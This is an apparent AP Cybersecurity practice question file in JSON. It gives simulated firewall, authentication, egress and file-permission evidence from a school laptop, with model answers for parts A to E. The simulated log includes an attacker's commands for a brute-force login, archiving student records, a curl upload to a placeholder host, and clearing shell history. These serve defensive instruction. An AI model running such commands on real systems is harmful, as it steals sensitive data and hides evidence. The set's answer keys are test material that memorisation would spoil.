@@ -1,0 +1,451 @@
+{
+  "_comment": [
+    "DEVICE SECURITY ANALYSIS practice set 2.",
+    "",
+    "Deliberately NOT a reskin of set 1. A student who did the kiosk set should",
+    "not be able to pattern match their way through this one:",
+    "  - Part B is a brute force against ONE account (many failures, same user)",
+    "    rather than set 1's username enumeration (one failure each, many users).",
+    "    Telling those two apart is the actual skill.",
+    "  - Part D's block is OUTBOUND. Set 1's was inbound. A student who learned",
+    "    'find the UFW BLOCK with a DPT' has to read the direction column here.",
+    "  - Part E is data exfiltration, not persistence. There is no backdoor and no",
+    "    cron job; the damage is already done by the time the log ends.",
+    "  - Part C's interesting file is world-READABLE holding credentials, rather",
+    "    than world-WRITABLE holding executable code.",
+    "",
+    "The device is a school athletics department laptop. Chosen because the data",
+    "at risk (student medical clearance forms) is obviously sensitive without",
+    "needing any security background to see it."
+  ],
+  "course": "ap-cybersecurity",
+  "set_id": "dsa-athletics-laptop",
+  "title": "Device Security Analysis: the athletics department laptop",
+  "device": "Athletics department laptop, Northgate High School",
+  "est_minutes": 50,
+  "page_handle": "ap-cybersecurity-frq-athletics-laptop",
+  "page_title": "AP Cybersecurity FRQ Practice: Device Security Analysis | Athletics Laptop",
+  "seo_description": "A second full Device Security Analysis practice question in the real exam format: six sources, parts A to E, with sample responses for every subpart.",
+  "intro": [
+    "The following sources all come from the same device and were captured during a risk assessment.",
+    "The device is the athletics department laptop at Northgate High School. Its IP address is 10.20.5.44. It is used by three coaches to record match results and to store student medical clearance forms. It travels to away fixtures and connects to visitor networks.",
+    "Use the sources to respond to parts A, B, C, D, and E. Label any subparts. Cite specific evidence from the sources in your responses."
+  ],
+  "sources": [
+    {
+      "kind": "firewall-rules",
+      "label": "Source 1: Device firewall settings",
+      "note": "The device's IP address is 10.20.5.44.",
+      "columns": [
+        "Rule",
+        "Action",
+        "Source",
+        "Destination",
+        "Direction",
+        "Port",
+        "Protocol"
+      ],
+      "rules": [
+        [
+          "1",
+          "Allow",
+          "10.20.0.0/16",
+          "10.20.5.44",
+          "Inbound",
+          "22",
+          "SSH"
+        ],
+        [
+          "2",
+          "Allow",
+          "ALL",
+          "10.20.5.44",
+          "Inbound",
+          "3389",
+          "RDP"
+        ],
+        [
+          "3",
+          "Allow",
+          "10.20.5.44",
+          "ALL",
+          "Outbound",
+          "443",
+          "HTTPS"
+        ],
+        [
+          "4",
+          "Allow",
+          "10.20.5.44",
+          "ALL",
+          "Outbound",
+          "53",
+          "DNS"
+        ],
+        [
+          "5",
+          "Allow",
+          "10.20.5.44",
+          "ALL",
+          "Outbound",
+          "80",
+          "HTTP"
+        ],
+        [
+          "6",
+          "Deny",
+          "10.20.5.44",
+          "ALL",
+          "Outbound",
+          "21",
+          "FTP"
+        ],
+        [
+          "7",
+          "Allow",
+          "10.20.5.44",
+          "10.20.5.10",
+          "Outbound",
+          "445",
+          "SMB"
+        ],
+        [
+          "8",
+          "Deny",
+          "ALL",
+          "10.20.5.44",
+          "Inbound",
+          "445",
+          "SMB"
+        ],
+        [
+          "9",
+          "Deny",
+          "ALL",
+          "ALL",
+          "Inbound",
+          "ALL",
+          "ALL"
+        ],
+        [
+          "10",
+          "Allow",
+          "10.20.5.44",
+          "ALL",
+          "Outbound",
+          "ALL",
+          "ALL"
+        ]
+      ]
+    },
+    {
+      "kind": "auth-log",
+      "label": "Source 2: Authorization log",
+      "command": "sudo tail -n 28 /var/log/auth.log",
+      "lines": [
+        "1 - Apr 14 07:31:02 athletics sshd[640]: Server listening on 0.0.0.0 port 22.",
+        "2 - Apr 14 07:58:19 athletics systemd-logind[602]: New session 2 of user coachr.",
+        "3 - Apr 14 16:44:07 athletics sshd[1780]: Failed password for coachr from 10.20.9.130 port 39112 ssh2",
+        "4 - Apr 14 16:44:09 athletics sshd[1782]: Failed password for coachr from 10.20.9.130 port 39114 ssh2",
+        "5 - Apr 14 16:44:11 athletics sshd[1784]: Failed password for coachr from 10.20.9.130 port 39116 ssh2",
+        "6 - Apr 14 16:44:13 athletics sshd[1786]: Failed password for coachr from 10.20.9.130 port 39118 ssh2",
+        "7 - Apr 14 16:44:15 athletics sshd[1788]: Failed password for coachr from 10.20.9.130 port 39120 ssh2",
+        "8 - Apr 14 16:44:17 athletics sshd[1790]: Failed password for coachr from 10.20.9.130 port 39122 ssh2",
+        "9 - Apr 14 16:44:19 athletics sshd[1792]: Failed password for coachr from 10.20.9.130 port 39124 ssh2",
+        "10 - Apr 14 16:44:21 athletics sshd[1794]: Failed password for coachr from 10.20.9.130 port 39126 ssh2",
+        "11 - Apr 14 16:44:23 athletics sshd[1796]: Failed password for coachr from 10.20.9.130 port 39128 ssh2",
+        "12 - Apr 14 16:44:25 athletics sshd[1798]: Accepted password for coachr from 10.20.9.130 port 39130 ssh2",
+        "13 - Apr 14 16:44:25 athletics sshd[1798]: pam_unix(sshd:session): session opened for user coachr by (uid=0)",
+        "14 - Apr 14 16:45:02 athletics coachr: executed command: 'ls -l /home/coachr/forms'",
+        "15 - Apr 14 16:45:31 athletics coachr: executed command: 'cat /home/coachr/forms/team_portal.ini'",
+        "16 - Apr 14 16:46:10 athletics coachr: executed command: 'tar -czf /tmp/f.tgz /home/coachr/forms'",
+        "17 - Apr 14 16:46:44 athletics kernel: [UFW BLOCK] OUT=eth0 SRC=10.20.5.44 DST=203.0.113.61 PROTO=TCP SPT=44902 DPT=21",
+        "18 - Apr 14 16:46:52 athletics kernel: [UFW BLOCK] OUT=eth0 SRC=10.20.5.44 DST=203.0.113.61 PROTO=TCP SPT=44904 DPT=21",
+        "19 - Apr 14 16:47:30 athletics coachr: executed command: 'curl -T /tmp/f.tgz https://filedrop.example.net/u'",
+        "20 - Apr 14 16:48:05 athletics coachr: executed command: 'rm /tmp/f.tgz'",
+        "21 - Apr 14 16:48:40 athletics coachr: executed command: 'history -c'",
+        "22 - Apr 14 16:49:01 athletics sshd[1798]: pam_unix(sshd:session): session closed for user coachr",
+        "23 - Apr 14 17:15:00 athletics CRON[1900]: pam_unix(cron:session): session opened for user root by (uid=0)",
+        "24 - Apr 14 17:15:00 athletics CRON[1900]: pam_unix(cron:session): session closed for user root",
+        "25 - Apr 14 18:02:33 athletics systemd-logind[602]: New session 5 of user coacht.",
+        "26 - Apr 14 18:40:12 athletics sudo: coacht : TTY=pts/0 ; PWD=/home/coacht ; USER=root ; COMMAND=/usr/bin/apt-get upgrade",
+        "27 - Apr 14 18:40:13 athletics sudo: pam_unix(sudo:session): session opened for user root by coacht(uid=1002)",
+        "28 - Apr 14 18:44:50 athletics sudo: pam_unix(sudo:session): session closed for user root"
+      ]
+    },
+    {
+      "kind": "app-log",
+      "label": "Source 3: Network egress log",
+      "command": "sudo tail -n 10 /var/log/egress.log",
+      "lines": [
+        "1 - Apr 14 08:00:04 athletics egress: 10.20.5.44 -> 10.20.5.10:445 allowed 2.1 MB",
+        "2 - Apr 14 12:14:20 athletics egress: 10.20.5.44 -> 142.250.0.14:443 allowed 0.4 MB",
+        "3 - Apr 14 16:46:44 athletics egress: 10.20.5.44 -> 203.0.113.61:21 DENIED 0 MB",
+        "4 - Apr 14 16:46:52 athletics egress: 10.20.5.44 -> 203.0.113.61:21 DENIED 0 MB",
+        "5 - Apr 14 16:47:30 athletics egress: 10.20.5.44 -> 198.51.100.204:443 allowed 41.7 MB",
+        "6 - Apr 14 16:49:10 athletics egress: 10.20.5.44 -> 142.250.0.14:443 allowed 0.2 MB",
+        "7 - Apr 14 18:41:02 athletics egress: 10.20.5.44 -> 91.189.88.10:80 allowed 88.3 MB",
+        "8 - Apr 14 19:00:00 athletics egress: 10.20.5.44 -> 10.20.5.10:445 allowed 1.8 MB",
+        "9 - Apr 14 20:15:41 athletics egress: 10.20.5.44 -> 142.250.0.14:443 allowed 0.3 MB",
+        "10 - Apr 14 22:00:00 athletics egress: 10.20.5.44 -> 10.20.5.10:445 allowed 1.9 MB"
+      ]
+    },
+    {
+      "kind": "file-listing",
+      "label": "Source 4: File permissions in /home/coachr/forms",
+      "command": "ls -l /home/coachr/forms",
+      "columns": [
+        "Permissions",
+        "Links",
+        "Owner",
+        "Group",
+        "Size",
+        "Modified",
+        "Name"
+      ],
+      "entries": [
+        [
+          "-rw-r--r--",
+          "1",
+          "coachr",
+          "athletics",
+          "18442",
+          "Apr 02 09:15",
+          "medical_clearance_2026.csv"
+        ],
+        [
+          "-rw-r--r--",
+          "1",
+          "coachr",
+          "athletics",
+          "884",
+          "Jan 19 11:40",
+          "team_portal.ini"
+        ],
+        [
+          "-rwxr-xr-x",
+          "1",
+          "root",
+          "root",
+          "3120",
+          "Nov 30 08:00",
+          "roster_import.sh"
+        ],
+        [
+          "-rw-rw----",
+          "1",
+          "coachr",
+          "athletics",
+          "6602",
+          "Apr 14 15:58",
+          "match_results.csv"
+        ],
+        [
+          "drwxr-xr-x",
+          "2",
+          "coachr",
+          "athletics",
+          "4096",
+          "Apr 02 09:10",
+          "archive"
+        ]
+      ]
+    },
+    {
+      "kind": "process-list",
+      "label": "Source 5: Listening services",
+      "command": "ss -tuln",
+      "lines": [
+        "Netid  State   Local Address:Port    Peer Address:Port",
+        "tcp    LISTEN  0.0.0.0:22           0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:3389         0.0.0.0:*",
+        "tcp    LISTEN  127.0.0.1:631        0.0.0.0:*"
+      ]
+    },
+    {
+      "kind": "policy",
+      "label": "Source 6: District device acceptable use policy",
+      "sections": {
+        "Required": [
+          "Any device holding student records must require a separate account for each staff member who uses it.",
+          "Student medical information must be stored only in the district student information system.",
+          "Devices taken off campus must have full disk encryption enabled."
+        ],
+        "Permitted": [
+          "Staff may connect to a device over SSH from any address within the district network, 10.20.0.0/16.",
+          "Staff may install operating system updates from the district's approved repository."
+        ],
+        "Prohibited": [
+          "Transferring student records to any storage service not approved by the district.",
+          "Using a shared password for any staff account.",
+          "Disabling logging or clearing command history on a district device."
+        ]
+      }
+    }
+  ],
+  "parts": {
+    "A": {
+      "subject": "policy",
+      "stem": "Consider the acceptable use policy in Source 6.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one part of the policy helps protect the device.",
+          "credit": [
+            "Names one specific policy item",
+            "Explains the protection in terms of a threat it reduces"
+          ],
+          "sample": "The Required section says any device holding student records must require a separate account for each staff member. This protects the device because it makes actions attributable. Source 2 shows every command in the incident running as coachr, so if all three coaches shared that account the log would tell an investigator which account acted but not which person. Separate accounts also mean that compromising one coach's password, as happened in rows 3 to 12, does not hand the adversary a credential that every other coach is still using elsewhere."
+        },
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example in your response.",
+          "credit": [
+            "Identifies a specific rule that is too weak",
+            "States a concrete modification",
+            "Connects it to evidence from the sources"
+          ],
+          "sample": "The Permitted section allows staff to connect over SSH from any address within 10.20.0.0/16. That is the entire district network, including the student wireless range, and the brute force in rows 3 to 12 came from 10.20.9.130, an address inside it. The rule could be modified to permit SSH only from the athletics office subnet, for example 10.20.5.0/24, and to require key based authentication rather than a password. Firewall rule 1 would narrow from 10.20.0.0/16 to 10.20.5.0/24, and the attempt from 10.20.9.130 would never have reached the SSH service at all."
+        }
+      ]
+    },
+    "B": {
+      "subject": "password-attack",
+      "stem": "In the authorization log, there is evidence of a password attack in rows 3 to 12.",
+      "subparts": [
+        {
+          "verb": "Describe",
+          "prompt": "Describe the evidence in the log file that indicates a password attack. Include specific entries from the log file in your response.",
+          "credit": [
+            "Cites at least two specific rows",
+            "Names the pattern: repeated failures against ONE account from one source at machine speed",
+            "States that row 12 succeeded, so the attack worked"
+          ],
+          "sample": "Rows 3 to 11 are nine failed SSH password attempts for the single account coachr, all from 10.20.9.130, at two second intervals from 16:44:07 to 16:44:23. The source port increases by two each time, 39112 through 39128, which shows a new connection per attempt rather than a person retyping at one prompt. This is a brute force against one known account rather than a search for which accounts exist. Row 12 then reads Accepted password for coachr from the same address at 16:44:25, so the tenth attempt succeeded and every command from row 14 onward is the adversary."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "Identify the IP address of the adversary.",
+          "credit": [
+            "States 10.20.9.130"
+          ],
+          "sample": "10.20.9.130"
+        }
+      ]
+    },
+    "C": {
+      "subject": "permissions",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how the permission settings for one file in the /home/coachr/forms directory determine the level of access for that file for the owner, group, and all other users on the system. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file from Source 4",
+            "Reads all three triads correctly",
+            "States what each class can actually do, and why it matters here"
+          ],
+          "sample": "medical_clearance_2026.csv has permissions -rw-r--r--. The first triad, rw-, gives the owner coachr read and write. The second, r--, gives the group athletics read only. The third, r--, gives every other user on the system read access as well. So any account on this laptop, not only the three coaches, can open a file of student medical clearance records. Source 2 row 14 shows the adversary listing this directory immediately after logging in, and row 16 shows the whole directory being archived, which only worked because the files inside were readable by the account they had taken."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than removing all permissions from all users, describe one way the permission settings for one file on the system could be configured to restrict access for some users on the device. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file",
+            "Restriction still leaves the file usable",
+            "Identifies which class loses which access"
+          ],
+          "sample": "team_portal.ini is currently -rw-r--r--, and row 15 shows the adversary reading it, which matters because a .ini file of this name is where portal credentials live. It could be configured so the owner coachr keeps read and write and both the group and all other users have no access. The coach's own tools, which run as coachr, would still read the file, while another account on the laptop could not. The same change applied to medical_clearance_2026.csv would also bring the device closer to the Required policy item about student records."
+        },
+        {
+          "verb": "Write",
+          "prompt": "Using the explanation from part C (ii), write one or more chmod commands that set the permissions described.",
+          "credit": [
+            "Command names the correct file",
+            "Mode produces exactly the described access",
+            "Valid chmod syntax"
+          ],
+          "sample": "chmod 600 /home/coachr/forms/team_portal.ini\n\nThe 6 gives the owner read and write, and the two zeros remove all access for the group and for all other users. The symbolic equivalent is chmod u=rw,go= /home/coachr/forms/team_portal.ini. Applying the same to the records file, chmod 600 /home/coachr/forms/medical_clearance_2026.csv, closes the exposure described in part C (i)."
+        }
+      ]
+    },
+    "D": {
+      "subject": "firewall",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one connection attempt on the device was blocked by the device's firewall. Include evidence from a log file in your response.",
+          "credit": [
+            "Cites a specific log row showing the block",
+            "Names the rule number",
+            "Notes the direction, outbound, and matches port and protocol"
+          ],
+          "sample": "Rows 17 and 18 of the authorization log show UFW BLOCK entries at 16:46:44 and 16:46:52 with OUT=eth0, source 10.20.5.44 and destination 203.0.113.61 on port 21. Source 3 records the same two events as DENIED with 0 MB transferred. Rule 6 in Source 1 denies outbound FTP from this device to all destinations, so the archive the adversary had just created in row 16 could not leave over FTP. Note the direction: this is the device's own outbound traffic being stopped, not an inbound attempt."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection attempt identified in part D (i).",
+          "credit": [
+            "Names the rule being changed",
+            "Modification is scoped rather than a blanket allow",
+            "Would actually permit the described attempt"
+          ],
+          "sample": "Rule 6 denies outbound FTP to every destination. It could be modified to deny outbound port 21 except to a single approved destination, or an allow for source 10.20.5.44 to destination 203.0.113.61 outbound on port 21 could be added above rule 6. Order matters: rule 10 already allows all outbound traffic, so the deny at rule 6 is what stops FTP today, and any allow has to be evaluated before it."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing the connection attempt identified in part D (i), describe one impact of your modification from part D (ii) on incoming or outgoing network traffic on the device.",
+          "credit": [
+            "Describes a consequence beyond the intended one",
+            "Follows from the specific modification"
+          ],
+          "sample": "FTP sends both credentials and file contents in clear text, so permitting it means anything this laptop uploads that way is readable by anyone positioned on the path, including on the visitor networks it joins at away fixtures. It also removes a control that was doing real work here: rule 6 is the reason rows 17 and 18 are blocks rather than a completed transfer. Any future exfiltration over FTP would then succeed silently, and the egress log would record it as allowed rather than DENIED."
+        }
+      ]
+    },
+    "E": {
+      "subject": "second-attack",
+      "stem": "Apart from the password attack identified in part B, there is evidence of another attack on the device. Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Determine",
+          "prompt": "Determine the type of attack evidenced in a log file.",
+          "credit": [
+            "Names a specific attack type",
+            "Matches the evidence: data exfiltration or data theft, with anti forensics"
+          ],
+          "sample": "Data exfiltration. After gaining the coachr account the adversary collected the student records directory into a single archive and uploaded it to an external service, then removed the local traces."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe specific information in the log file that indicates the attack named in part E (i).",
+          "credit": [
+            "Cites the archive creation",
+            "Cites the successful upload and its size",
+            "Notes the cleanup, and that the FTP block did not stop it"
+          ],
+          "sample": "Row 16 shows tar -czf /tmp/f.tgz /home/coachr/forms, which packages the entire forms directory, including medical_clearance_2026.csv. Rows 17 and 18 show two attempts to reach 203.0.113.61 over FTP being blocked. Row 19 then shows curl -T /tmp/f.tgz to an external HTTPS address, and Source 3 row 5 records 41.7 MB leaving the device to 198.51.100.204 on port 443 at exactly 16:47:30. That is the exfiltration: blocked on FTP, successful over HTTPS, which rule 3 permits. Rows 20 and 21 then delete the archive and clear the shell history, which the policy in Source 6 explicitly prohibits and which is intended to remove evidence."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe one way an automated system could halt this type of attack in real time.",
+          "credit": [
+            "Names a specific automated control",
+            "Explains the mechanism against THIS attack"
+          ],
+          "sample": "A data loss prevention system inspecting outbound traffic could halt it. The upload in row 19 is a single 41.7 MB transfer to an external address that this device has never contacted before, immediately after an archive was created from a directory of student records. A DLP or egress filtering system that blocks uploads above a size threshold to unapproved destinations, or that inspects for record patterns such as student identifiers, can drop the transfer while it is in progress. Note that a rule which only blocks FTP, as rule 6 does, is not enough: the attacker simply used the port that was open."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "This attack could be mitigated by an automated system, such as a firewall, IDS, IPS, or AI. Identify a different countermeasure that could mitigate, prevent, or deter the attack.",
+          "credit": [
+            "Names a non automated countermeasure",
+            "Plausibly prevents, mitigates or deters this attack"
+          ],
+          "sample": "Not storing the records on this device at all. The Required section of Source 6 already says student medical information must live only in the district student information system, and this laptop is holding a CSV of it. If the file were not there, a compromised coach account would still be a problem but there would be nothing in /home/coachr/forms to archive and upload. Encrypting the files at rest with a key the account does not automatically hold would mitigate it a second way: the archive would still leave, but its contents would be useless."
+        }
+      ]
+    }
+  }
+}
